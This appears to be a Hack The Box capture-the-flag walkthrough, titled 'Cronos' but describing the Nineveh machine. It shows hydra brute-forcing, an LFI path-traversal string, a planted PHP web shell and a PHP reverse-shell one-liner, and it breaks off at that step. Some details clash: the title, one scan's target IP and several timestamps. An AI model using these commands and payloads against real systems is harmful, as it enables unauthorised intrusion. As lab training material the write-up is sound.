# Hack The Box - Cronos Walkthrough without Metasploit

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Nineveh]
└─$ sudo nmap -sC -sV -O 10.10.10.43 -Pn
[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-19 11:19 EST
Nmap scan report for 10.10.10.43
Host is up (0.13s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 4.8 (92%)
No exact OS matches for host (test conditions non-ideal).

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 19 11:20:52 2023 -- 1 IP address (1 host up) scanned in 36.56 seconds
```

We get back the following result showing that 3 ports are open:
- Port `80`: running `Apache httpd 2.4.18`
- Port `443`: running `ssl/http Apache httpd 2.4.18`


Before starting enumeration, I ran a more comprehensive nmap scan in the background to make sure that I did not miss anything.

So I ran an Nmap scan that covers all ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Nineveh]
└─$ sudo nmap -sC -sV -O -p- 10.10.10.43 -Pn
[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-19 11:20 EST
# Nmap 7.92 scan initiated Thu Jan 19 08:01:17 2023 as: nmap -sC -sV -O -p- -oA nmap/full 10.10.10.43
Nmap scan report for 10.10.10.43
Host is up (0.13s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.18 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_http-title: Site doesn't have a title (text/html).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 19 11:22:20 2023 -- 1 IP address (1 host up) scanned in 183.18 seconds
```

Apart from this, I also ran general nmap vulnerability scan scripts to determine if any of the services are vulnerable

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Cronos]
└─$ nmap --script vuln 10.10.10.13 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-18 23:55 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.43
Host is up (0.13s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE
80/tcp  open  http
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|_  /info.php: Possible information file
443/tcp open  https
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /db/: BlogWorx Database
|_  /db/: Potentially interesting folder
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-cookie-flags: 
|   /db/: 
|     PHPSESSID: 
|       secure flag not set and HTTPS in use
|_      httponly flag not set

# Nmap done at Thu Jan 19 11:25:11 2023 -- 1 IP address (1 host up) scanned in 359.92 seconds
```

## Enumeration
First, add the domain name to the `/etc/hosts` file.

```
10.10.10.43 nineveh.htb
```

I first visited port `80` 

![n-1](https://user-images.githubusercontent.com/87711310/213497393-537de6ad-62a2-4034-bcdc-59cf128a4c64.png)

Viewing the source-code of the pagge reveals nothing of use.

So i ran gobuster on the application.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Nineveh]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.43
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.43
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/19 11:27:29 Starting gobuster in directory enumeration mode
===============================================================
/department           (Status: 301) [Size: 315] [--> http://10.10.10.43/department/]
/server-status        (Status: 403) [Size: 299]

===============================================================
2023/01/19 11:28 Finished
===============================================================

```

I visited the `/department` directory and I was directed to a login form

![nin-1](https://user-images.githubusercontent.com/87711310/213498642-46fe8b3f-39c7-4630-8870-614269322895.png)

Viewing the source-code reveals an important thing that there are atleast two users: `amrois` & `admin` 

![nin-2](https://user-images.githubusercontent.com/87711310/213499016-7b4e1498-8905-4883-b3f5-6163ff1b7f9a.png)

I tried common passwords(admin:admin, admin:password123, etc) but it was of no use. There was another thing that I noticed. 

If I try to login with the user `admin` and a random password we get the error `Invalid Password!`, whereas if we try to login with the user `amrois` and a random password we get the error `invalid username`. 

This verbose message that is outputted by the application allows us to enumerate usernames. So far, I knew that `admin` is a valid user.

I intercepted the request using `Burp` to get the exact error I was getting: `Invalid Password!` so that I could use this to brute-force the password using `hydra`

![n-2](https://user-images.githubusercontent.com/87711310/213497267-8fb9b8e6-2e02-41e7-8fa7-50415745930a.png)

```
hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt nineveh.htb http-post-form "/department/login.php:username=^USER^&password=^PASS^&Login=Login:Invalid Password!"
```
NOTE: You need to change the double-copy and re-enter them if you copy and paste it from here

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Nineveh]
└─$ hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt nineveh.htb http-post-form "/department/login.php:username=^USER^&password=^PASS^&Login=Login:Invalid Password"
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-19 11:59:06
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://nineveh.htb:80/department/login.php:username=^USER^&password=^PASS^&Login=Login:Invalid Password
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] 2421.00 tries/min, 2421 tries in 00:01h, 14341978 to do in 98:44h, 16 active
[VERBOSE] Page redirected to http://nineveh.htb/department/manage.php
[80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t
[STATUS] attack finished for nineveh.htb (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-1-19 11:35:12
```

It found the valid password! Log into the application using the credentials we found.

Visit the Notes tab. We get the following text.

![n-3](https://user-images.githubusercontent.com/87711310/213497269-a01275d4-acc1-49db-aeb1-9e2cd617c0c8.png)

One thing to notice is the URL that generates the page looks like a file path.


When you see a file path, the first thing you should try is an LFI. I tried and it didn’t exactly work. When I try the following string.
```
../../../../../../../etc/passwd
```

I get a “No Note is selected” message. However, when I try the following string.
```
files/ninevehNotes/../../../../etc/passwd
```

I get a warning message.
![n-5](https://user-images.githubusercontent.com/87711310/213497276-f643487b-4086-4b03-bcbe-da07928e0c2f.png)

If I remove “ninevehNotes” from the URL.
```
files/../../../../etc/passwd
```

I’m back to the “No Note is selected” message. This leads me to believe that it is vulnerable to LFI, however, there is a check on the backend that is grepping for the string “ninevehNotes” since my query doesn’t work without it.
According to the error, we’re in the `/www/html/department/` directory, so we need to go `three` directories above. Let’s try with this string.
```
http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../etc/passwd
```
& It worked!

![n-4](https://user-images.githubusercontent.com/87711310/213497270-60e87c47-3d2c-4584-8d2b-045ab982b7ac.png)

When it comes to LFIs, you usually need to chain it to another vulnerability in order to get remote code execution. Therefore, I’m going to start enumerating the next port to see if I can find another vulnerability that I can chain this one to.

Visiting the web-page I was presented the following.

![n-6](https://user-images.githubusercontent.com/87711310/213497278-51c4d5e0-2d44-40a6-af52-0ca97d7ec0a9.png)

I glanced at the source-code, no use and then I decided to look at teh SSL certificate since it was metioned in the Nmap scan.

![n-7](https://user-images.githubusercontent.com/87711310/213497281-d73cbaab-6cda-4c9a-9bf0-e998f3051919.png)

We find an email address that might be useful later. Next, I ran gobuster on the application.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Nineveh]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://nineveh.htb -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://nineveh.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/19 12:23:37 Starting gobuster in directory enumeration mode
/db (Status: 301)
/server-status (Status: 403)
/secure_notes (Status: 301)
===============================================================
2023/1/19 12:24:46 Finished
===============================================================
```

The `/secure_notes` directory gives us the following image.

![nnv-1](https://user-images.githubusercontent.com/87711310/213518678-f56d83b3-0c88-48a6-9174-24964206bb1e.png)

This might be what the comment “check your secret folder” was referring to. Save the image, it might have a secret stored in it. We’ll look into that later.

The `/db` directory leads us to the following page.

![n-8](https://user-images.githubusercontent.com/87711310/213497286-aaf5eedd-633f-424c-9b01-1beb0c24188c.png)

I tried the default password “admin” for phpLiteAdmin v1.9 but that did not work.

Let’s try brute-forcing the password. First, intercept the request in Burp to get the error you get when you enter wrong credentails.

```
hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true&Login=Login:Incorrect password."
```
We get back the following result.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Nineveh]
└─$ hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true&Login=Login:Incorrect password."

Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-19 12:39:31
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-forms://nineveh.htb:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true&Login=Login:Incorrect password.
[443][http-post-form] host: nineveh.htb   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-12-28 12:49:10
```

We got a valid password! Use password123 to log into the application. Since this is an off the shelf application, let’s use searchsploit to find out if it is associated with any vulnerabilities.
```
searchsploit phpLiteAdmin 1.9
```

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Nineveh]
└─$ searchsploit phpLiteAdmin 1.9
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                                                                            | php/webapps/24044.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                                                                             | php/webapps/39714.txt
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```


Let’s view the content of the Remote PHP Code Injection exploit. According to the comments made in the [exploit](https://www.exploit-db.com/exploits/24044), an attacker can create a sqlite database with a php extension and insert php code as text fields. When done, the attacker can execute it simply by accessing the database file using the browser.

## Gaining an Initial Foothold
In the `Create New Database` section, create a new database called `test.php`. Then click on `test.php` in the __Change Database__ section. There, create a new table called `random` with `1` field. In the Field parameter add the following code and change the __Type__ to `TEXT`.

```
<?php echo system($_REQUEST ["cmd"]); ?>
```

![n-10](https://user-images.githubusercontent.com/87711310/213497284-f6f525fc-5407-49ab-8ff4-a04daf625d42.png)

Click Create. As mentioned in the below image, the file is created in the directory `/var/tmp`.


Now, let’s go back to the LFI vulnerability and execute our php code.
```
http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../../var/tmp/random.php&cmd=ls
```

We get back the following page.

![n-11](https://user-images.githubusercontent.com/87711310/213497287-3130aa7b-77f2-43d1-89ec-779ee1d712e9.png)

We have code execution! Let’s intercept the request in Burp and add a reverse shell to the cmd parameter.

```php
php -r '$sock=fsockopen("10.10.14.12",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
